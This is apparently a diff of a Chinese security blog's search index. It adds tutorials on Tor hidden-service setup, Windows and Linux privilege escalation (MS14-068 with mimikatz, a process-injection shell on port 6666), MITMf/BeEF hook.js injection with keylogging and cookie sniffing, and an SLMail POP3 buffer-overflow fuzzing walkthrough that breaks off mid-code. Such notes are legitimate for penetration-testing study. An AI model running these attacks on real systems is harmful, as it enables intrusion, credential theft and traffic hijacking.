@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>暗网网站搭建和onion域名获取方法</title>
+      <link href="/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/"/>
+      <url>/2018/06/12/Darknet/%E6%9A%97%E7%BD%91%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E5%92%8Conion%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="tor项目"><a href="#tor项目" class="headerlink" title="tor项目"></a><strong>tor项目</strong></h3><p>tor项目是美国海军的秘密项目，之后被开源用于真正的匿名网络中。在tor的网络中，你的真实的ip地址和其他和你有关的任何暴露于互联网的信息都会被隐藏，真正保护了用户。tor项目不但为一般用户提供客户端，同时也提供了.onion域名和服务，利用.onion域名可以把你网站的真正地址隐藏起来。</p></blockquote><h4 id="暗网网站搭建准备材料"><a href="#暗网网站搭建准备材料" class="headerlink" title="暗网网站搭建准备材料"></a><strong>暗网网站搭建准备材料</strong></h4><ul><li>服务器或本机内网映射</li><li>网站搭建相关技术</li></ul><p><strong>服务器选择</strong></p><p>如何你想真正隐藏自己，你需要做以下步骤</p><ul><li>建议使用Debian或者Ubuntu的服务器，tor官方文档支持较好</li><li>服务器只用来做tor网站不做其他的任何东西</li><li>匿名支付购买服务器</li><li>不要在服务器上运行 Tor 中继，因为 Tor 中继的ip是暴露的</li><li>不要接受和发送电子邮件</li></ul><p><strong>网站配置</strong></p><ul><li><p>安装nginx或者apache，这里以nginx为例（nginx的使用最为广泛）</p></li><li><p>编辑nginx配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen   127.0.0.1:xxxx;#xxxx是你的端口号 不要设置成80为了安全</span><br><span class="line"></span><br><span class="line">…</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sudo service nginx restart#重启服务</span><br></pre></td></tr></table></figure></li><li><p>以Debian服务器搭建暗网网站为例</p></li></ul><h4 id="Tor服务安装"><a href="#Tor服务安装" class="headerlink" title="Tor服务安装"></a><strong>Tor服务安装</strong></h4><ul><li>一般可以通过apt直接安装tor服务 <code>apt install tor</code></li></ul><p>如果不行请进行以下操作</p><ol><li><p>修改source.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br><span class="line">最后加下面这两行</span><br><span class="line">deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br><span class="line">deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org stretch main</span><br></pre></td></tr></table></figure></li><li><p>添加密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import</span><br><span class="line">gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add -</span><br></pre></td></tr></table></figure></li><li><p>安装tor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">sudo apt-get install tor</span><br></pre></td></tr></table></figure></li><li><p>dns选择</p><p> 默认是deb.torproject.org<br> 备选的有deb-master.torproject.org、mirror.netcologne.de、tor.mirror.youam.de</p></li><li><p>编辑tor配置文件</p><p> vi /etc/tor/torrc<br> 添加<br> HiddenServiceDir /var/lib/tor/hidden_service/<br> HiddenServicePort 80 127.0.0.1:8080</p></li><li><p>启动tor</p><p> <code>sudo service tor start</code><br> 一旦启动，那么你的域名也就生成了</p></li><li><p>查看onion域名</p><p> cat /var/lib/tor/hidden_service/hostname</p></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> Darknet </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 暗网 </tag>
+            
+            <tag> onion </tag>
+            
+            <tag> tor </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Python花式导包的几种方法</title>
       <link href="/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
       <url>/2018/03/15/Python/Python%E8%8A%B1%E5%BC%8F%E5%AF%BC%E5%8C%85%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
@@ -47,8 +76,6 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 免杀 </tag>
             
             <tag> backdoor-factory </tag>
@@ -60,6 +87,8 @@
             <tag> bdfproxy </tag>
             
             <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> arpspoof </tag>
             
@@ -88,13 +117,13 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 免杀 </tag>
             
             <tag> msfvenom </tag>
             
             <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> passing-the-hash </tag>
             
@@ -129,8 +158,6 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> 免杀 </tag>
             
             <tag> msfvenom </tag>
@@ -138,6 +165,8 @@
             <tag> MSF </tag>
             
             <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> Veil-Framework </tag>
             
@@ -170,8 +199,6 @@
       
         <tags>
             
-            <tag> C </tag>
-            
             <tag> 免杀 </tag>
             
             <tag> msfvenom </tag>
@@ -181,6 +208,8 @@
             <tag> Hyperion </tag>
             
             <tag> strings </tag>
+            
+            <tag> C </tag>
             
             <tag> gcc </tag>
             
@@ -246,11 +275,11 @@
       
         <tags>
             
-            <tag> python </tag>
-            
             <tag> MSF </tag>
             
             <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> meterpreter </tag>
             
@@ -285,9 +314,9 @@
             
             <tag> payload </tag>
             
-            <tag> ruby </tag>
-            
             <tag> shellcode </tag>
+            
+            <tag> ruby </tag>
             
         </tags>
       
@@ -349,9 +378,9 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> MSF </tag>
+            
+            <tag> nmap </tag>
             
             <tag> Metasploit </tag>
             
@@ -693,9 +722,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> SSH </tag>
-            
             <tag> VNC </tag>
+            
+            <tag> SSH </tag>
             
             <tag> proxychains </tag>
             
@@ -728,9 +757,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> shell </tag>
-            
             <tag> SSH </tag>
+            
+            <tag> shell </tag>
             
             <tag> 隧道 </tag>
             
@@ -776,35 +805,29 @@
     
     
     <entry>
-      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      <title>利用漏洞和程序配置不当提权</title>
+      <link href="/2015/06/06/Exploits/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
+      <url>/2015/06/06/Exploits/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
       
-        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+        <content type="html"><![CDATA[<blockquote><h3 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h3></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h3 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h3></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><p><code>icacls</code><br>    <code>icacls c:\windows\*.exe /save perm /T</code>    #快速查找windows系统中所有NTFS权限配置不当的程序<br>    <code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>    #快速查找linux系统中所有NTFS权限配置不当的程序<br><code>Find</code><br>    <code>find / -perm 777 -exec ls -l {} \;</code></p><p>应用系统的配置文件<br>    应用连接数据库的配置文件<br>    后台服务运行账号</p>]]></content>
       
       
       <categories>
           
           <category> 渗透测试 </category>
           
-          <category> 密码攻击 </category>
+          <category> 漏洞利用 </category>
           
-          <category> 嗅探欺骗 </category>
+          <category> 权限维持 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> arpspoof </tag>
+            <tag> 提权 </tag>
             
-            <tag> dnsspoof </tag>
-            
-            <tag> Mitmf </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> beef </tag>
+            <tag> mimikatz </tag>
             
         </tags>
       
@@ -842,6 +865,43 @@
             <tag> PTH </tag>
             
             <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
+      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 密码攻击 </category>
+          
+          <category> 嗅探欺骗 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> dnsspoof </tag>
+            
+            <tag> Mitmf </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> beef </tag>
             
         </tags>
       
@@ -946,13 +1006,13 @@
             
             <tag> kali </tag>
             
+            <tag> mimikatz </tag>
+            
             <tag> nc </tag>
             
             <tag> hashid </tag>
             
             <tag> hash‐identifier </tag>
-            
-            <tag> mimikatz </tag>
             
             <tag> hashcat </tag>
             
@@ -1087,6 +1147,68 @@
             <tag> Wordlist </tag>
             
             <tag> crunch </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>本地提权常见手法</title>
+      <link href="/2015/02/03/Exploits/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
+      <url>/2015/02/03/Exploits/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>已实现本地低权限账号登录<br>    远程溢出<br>    直接获得账号密码<br>希望获取更高权限<br>    实现对目标进一步控制<br>系统账号之间权限隔离<br>    操作系统安全的基础<br>    用户空间<br>    内核空间<br>系统账号<br>    用户账号登录时获取权限令牌<br>    服务账号无需用户登录已在后台启动服务</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>userAdministratorSystem    net user owl *        #修改密码    net user    #查看用户账号</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h5><pre><code>userRoot</code></pre><blockquote><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4></blockquote><p>Windows system账号<br>    系统设置管理功能<br>    SysInternal Suite<br>        <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></p><pre><code>psexec -i -s -d taskmgrat 19:39 /interactive cmd    #win10已弃用at,改用sc和schtaskssc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactsc start syscmd</code></pre><blockquote><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4></blockquote><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> 权限维持 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> pinjector </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows缓冲区溢出测试</title>
+      <link href="/2014/08/11/Buffer_Overflow/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
+      <url>/2014/08/11/Buffer_Overflow/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nSending evil buffer...."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"></span><br><span class="line">s.send(<span class="string">'USER user'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>测试PASS命令接收到大量数据时是否会溢出<br>EIP寄存器存放下一条指令的地址</p><blockquote><h4 id="python代码02-py"><a href="#python代码02-py" class="headerlink" title="python代码02.py"></a>python代码<code>02.py</code></h4></blockquote><p>以每200递增循环发送A,测试溢出点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">buffer=[<span class="string">"A"</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> len(buffer)&lt;=<span class="number">30</span>:</span><br><span class="line">buffer.append(<span class="string">"A"</span>=*counter)</span><br><span class="line">counter=counter+<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fuzzing PASS with %s bytes"</span> % len(string)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+string+<span class="string">'\r\n'</span>)</span><br><span class="line">s.send(<span class="string">'QUIT\r\n'</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><blockquote><h4 id="2700个字符实现EIP寄存器溢出03-py"><a href="#2700个字符实现EIP寄存器溢出03-py" class="headerlink" title="2700个字符实现EIP寄存器溢出03.py"></a>2700个字符实现EIP寄存器溢出<code>03.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">'A'</span>*<span class="number">2700</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>找到精确溢出的4个字符<br>    二分法<br>    唯一字串法<br>        <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700</code></p><blockquote><h4 id="python代码04-py"><a href="#python代码04-py" class="headerlink" title="python代码04.py"></a>python代码<code>04.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 